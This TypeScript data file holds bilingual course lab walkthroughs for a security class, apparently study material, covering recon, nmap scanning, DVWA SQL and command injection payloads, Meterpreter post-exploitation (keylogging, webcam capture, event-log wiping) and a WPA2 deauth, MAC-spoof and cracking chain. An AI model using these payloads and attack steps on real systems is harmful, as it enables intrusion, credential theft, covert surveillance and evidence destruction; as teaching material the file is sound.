/**
 * Practical / Hands-on lab walkthroughs.
 * Sourced from official course practical exam solutions
 * (originally authored by student Duha M. Twam, integrated as study material).
 */

export interface PracticalStep {
  title: string;
  command?: string;
  explanation: string;
  output?: string;
}

export interface PracticalSection {
  id: string;
  title: string;
  titleAr: string;
  goal: string;
  goalAr: string;
  category: "reconnaissance" | "scanning" | "exploitation" | "post-exploitation" | "wireless" | "cracking";
  tool: string;
  steps: PracticalStep[];
}

export interface PracticalLab {
  courseId: string;
  intro: string;
  introAr: string;
  sections: PracticalSection[];
}

export const practicalLabs: PracticalLab[] = [
  // ─────────────────────────────────────────────────────────
  // COURSE 1 — Software & Information Security (1272)
  // ─────────────────────────────────────────────────────────
  {
    courseId: "infosec-1272",
    intro: "End-to-end practical walkthrough mirroring the official 1272 final practical exam: reconnaissance → vulnerability scanning → web exploitation (DVWA) → post-exploitation with Meterpreter.",
    introAr: "جولة تطبيقية شاملة تعكس امتحان مقرر 1272 العملي: استطلاع → فحص ثغرات → استغلال ويب (DVWA) → ما بعد الاستغلال باستخدام Meterpreter.",
    sections: [
      {
        id: "recon",
        title: "Phase 1 — Reconnaissance",
        titleAr: "المرحلة الأولى — الاستطلاع",
        goal: "Gather domain & infrastructure intel passively without touching the target.",
        goalAr: "جمع معلومات النطاق والبنية التحتية بشكل سلبي دون التفاعل مع الهدف.",
        category: "reconnaissance",
        tool: "whois, dig, dnsrecon, traceroute, host",
        steps: [
          {
            title: "Domain registration intel",
            command: "whois google.com",
            explanation: "Retrieves registrar, creation/expiration dates, name servers, and abuse contact. Pure passive recon — never touches target systems.",
            output: "Registrar: MarkMonitor Inc. | Created: 1997-09-15 | NS: NS1-4.GOOGLE.COM",
          },
          {
            title: "DNS A-record lookup",
            command: "dig google.com",
            explanation: "Queries the public DNS for the IPv4 address of the domain. Reveals server IP and DNS infrastructure.",
            output: "A 142.250.75.206  |  status: NOERROR  |  query time: 7 ms",
          },
          {
            title: "Full DNS enumeration",
            command: "dnsrecon -d google.com",
            explanation: "Enumerates SOA, NS, MX, A, AAAA, and TXT records to map the target's DNS surface.",
          },
          {
            title: "Network path mapping",
            command: "traceroute google.com",
            explanation: "Reveals hops between you and the target. `*` rows mean a router blocked ICMP responses (likely a firewall — useful intel).",
          },
          {
            title: "Quick host info",
            command: "host google.com",
            explanation: "Fast IPv4/IPv6 + MX + HTTP service binding lookup.",
          },
          {
            title: "Reverse DNS on an IP",
            command: "whois 8.8.8.8",
            explanation: "Identifies which organisation owns a given IP address — useful before scanning.",
          },
        ],
      },
      {
        id: "vuln-scan",
        title: "Phase 2 — Vulnerability Discovery",
        titleAr: "المرحلة الثانية — اكتشاف الثغرات",
        goal: "Identify open ports, running services, and OS fingerprint of the target.",
        goalAr: "تحديد المنافذ المفتوحة والخدمات ونوع نظام التشغيل للهدف.",
        category: "scanning",
        tool: "Nmap",
        steps: [
          {
            title: "Service & OS scan",
            command: "nmap -sV -O -p- 192.168.44.129",
            explanation: "Full TCP port scan with service version and OS detection. Finds outdated services to attack — e.g. MySQL 5.0.51a (port 3306) and PostgreSQL 8.3.0 (port 5432).",
          },
          {
            title: "Stealth SYN scan",
            command: "nmap -sS 192.168.44.129",
            explanation: "Half-open SYN scan — never completes the TCP handshake, so it's stealthier and faster than a full connect scan.",
          },
        ],
      },
      {
        id: "sqli",
        title: "Phase 3 — SQL Injection (DVWA)",
        titleAr: "المرحلة الثالثة — حقن SQL",
        goal: "Extract a full database (schema → tables → columns → data) via UNION-based SQLi.",
        goalAr: "استخراج قاعدة بيانات كاملة عبر هجوم UNION-based SQL Injection.",
        category: "exploitation",
        tool: "DVWA + Burp Suite",
        steps: [
          {
            title: "Prove the vulnerability",
            command: "1' UNION SELECT database(), null #",
            explanation: "Returning the database name proves the injection works. The `#` comments out the rest of the original query.",
          },
          {
            title: "List tables",
            command: "1' UNION SELECT table_name, null FROM information_schema.tables #",
            explanation: "Pulls every table name visible to the application user.",
          },
          {
            title: "List columns of `users`",
            command: "1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' #",
            explanation: "Reveals the column layout of the users table.",
          },
          {
            title: "Extract usernames",
            command: "1' UNION SELECT user, null FROM users #",
            explanation: "Dumps every username.",
          },
          {
            title: "Extract password hashes",
            command: "1' UNION SELECT password, null FROM users #",
            explanation: "Returns MD5 password hashes — broken because MD5 is fast, unsalted, and rainbow-table'd.",
          },
          {
            title: "Crack the hashes",
            explanation: "Use online MD5 lookups or hashcat with rockyou.txt. Result: 4/5 admin passwords recovered in seconds — a textbook example of why salted bcrypt/argon2 is mandatory.",
          },
        ],
      },
      {
        id: "cmdi",
        title: "Phase 4 — Command Injection",
        titleAr: "المرحلة الرابعة — حقن الأوامر",
        goal: "Chain shell commands through a vulnerable web input.",
        goalAr: "تنفيذ أوامر شل من خلال إدخال ويب مصاب بثغرة.",
        category: "exploitation",
        tool: "DVWA Command Execution",
        steps: [
          {
            title: "Identify current user",
            command: "127.0.0.1; whoami",
            explanation: "The `;` lets a second command execute. `whoami` confirms the privilege level the web server runs as.",
          },
          {
            title: "List directory contents",
            command: "127.0.0.1; ls -la",
            explanation: "Maps the working directory — useful for finding config files, backups, or credentials.",
          },
        ],
      },
      {
        id: "meterpreter",
        title: "Phase 5 — Post-Exploitation (Meterpreter)",
        titleAr: "المرحلة الخامسة — ما بعد الاستغلال",
        goal: "After landing a Metasploit session, demonstrate post-exploitation commands.",
        goalAr: "بعد الحصول على جلسة Metasploit، استعراض أهم أوامر ما بعد الاستغلال.",
        category: "post-exploitation",
        tool: "Meterpreter",
        steps: [
          { title: "List processes",  command: "ps",          explanation: "Shows every process on the victim — pick a stable one to migrate into." },
          { title: "Take a screenshot", command: "screenshot", explanation: "Captures the victim's desktop — proof of access." },
          { title: "Keystroke logging", command: "keyscan_start / keyscan_dump", explanation: "Records what the victim is typing in real time." },
          { title: "Webcam access",    command: "webcam_snap", explanation: "Captures a still from the victim's webcam." },
          { title: "Privilege escalation", command: "getsystem", explanation: "Attempts to elevate the session to SYSTEM/root." },
          { title: "Clear evidence",   command: "clearev",     explanation: "Wipes the Windows event log — used by attackers; defenders should monitor for this." },
        ],
      },
    ],
  },

  // ─────────────────────────────────────────────────────────
  // COURSE 2 — Wireless Network Security
  // ─────────────────────────────────────────────────────────
  {
    courseId: "wireless-security",
    intro: "Hands-on wireless attack chain: discover → focus → deauth → MAC spoof → crack with a custom dictionary.",
    introAr: "سلسلة هجوم لاسلكي تطبيقية: اكتشاف الشبكات → التركيز على هدف → فصل اتصال → تزوير عنوان MAC → كسر المفتاح بقاموس مخصص.",
    sections: [
      {
        id: "discover",
        title: "Phase 1 — Discover Wireless Networks",
        titleAr: "المرحلة الأولى — اكتشاف الشبكات",
        goal: "Scan all nearby APs and capture beacon metadata.",
        goalAr: "مسح جميع نقاط الوصول المجاورة والتقاط بيانات الـ Beacon.",
        category: "wireless",
        tool: "airodump-ng",
        steps: [
          {
            title: "Scan all wireless networks",
            command: "airodump-ng wlan0mon",
            explanation: "Lists every nearby AP with BSSID, signal (PWR), channel (CH), encryption (ENC/CIPHER/AUTH), and ESSID. `<length: 0>` means a hidden SSID.",
          },
          {
            title: "Lock onto a single target",
            command: "airodump-ng --bssid 60:32:B1:5A:CE:27 --channel 11 -w testyou wlan0mon",
            explanation: "Filters to one BSSID & channel and saves capture files (named `testyou`) for later cracking. Cipher: CCMP, Auth: PSK → WPA2-PSK.",
          },
        ],
      },
      {
        id: "deauth",
        title: "Phase 2 — Deauthentication & MAC Spoofing",
        titleAr: "المرحلة الثانية — فصل الاتصال وتزوير العنوان",
        goal: "Force a client offline (to capture handshake or expose hidden SSID), then change your MAC address to evade filters.",
        goalAr: "إجبار عميل على قطع الاتصال (لالتقاط الـ Handshake أو كشف SSID مخفي) ثم تغيير عنوان MAC.",
        category: "wireless",
        tool: "aireplay-ng, macchanger",
        steps: [
          {
            title: "Send 600 deauth frames",
            command: "aireplay-ng -0 600 -a 60:32:B1:5A:CE:27 -c 05:AB:89:B4:C8:ED wlan0mon",
            explanation: "`-0 600` = 600 deauth packets, `-a` = AP MAC, `-c` = client MAC, on the monitor interface. The client will reconnect and broadcast the SSID — perfect for handshake capture.",
          },
          {
            title: "Spoof MAC address",
            command: "ifconfig wlan0 down && macchanger -m A1:C2:E3:D4:F4:B5 wlan0 && ifconfig wlan0 up",
            explanation: "Bring interface down, set a new MAC, bring it back up. `macchanger -p wlan0` restores the original.",
          },
        ],
      },
      {
        id: "crack",
        title: "Phase 3 — Build Dictionary & Crack the Key",
        titleAr: "المرحلة الثالثة — بناء قاموس وكسر المفتاح",
        goal: "Generate a targeted wordlist and crack the captured WPA2 handshake.",
        goalAr: "توليد قاموس موجّه وكسر مصافحة WPA2 الملتقطة.",
        category: "cracking",
        tool: "crunch, aircrack-ng",
        steps: [
          {
            title: "Build a 2,187-entry dictionary",
            command: "crunch 7 7 ab1 -o Desktop/duha.txt",
            explanation: "All 7-character combinations of the alphabet {a,b,1} = 3⁷ = 2,187. Verify with `wc -l Desktop/duha.txt`.",
          },
          {
            title: "Crack the WPA2 handshake",
            command: "aircrack-ng -w Desktop/duha.txt -b 60:32:B1:5A:CE:27 testyou-01.cap",
            explanation: "Runs the dictionary against the captured handshake. Result: KEY FOUND! [aaabb11] in <1 second at ~9,136 keys/s.",
          },
          {
            title: "Verify the key is in the wordlist",
            command: "grep -n 'aaabb11' Desktop/duha.txt",
            explanation: "Manual proof that the wordlist contains the target key.",
          },
          {
            title: "Why this approach has limits",
            explanation: "Exponential growth: a 7-char {a,b,1} set = 2,187 tries. A 10-char alphanumeric set = ~10⁷ tries. A 12-char complex password = trillions → infeasible. Lesson: long, complex passphrases + WPA3 defeat dictionary attacks.",
          },
        ],
      },
    ],
  },
];

export function getPracticalLab(courseId: string): PracticalLab | undefined {
  return practicalLabs.find((l) => l.courseId === courseId);
}
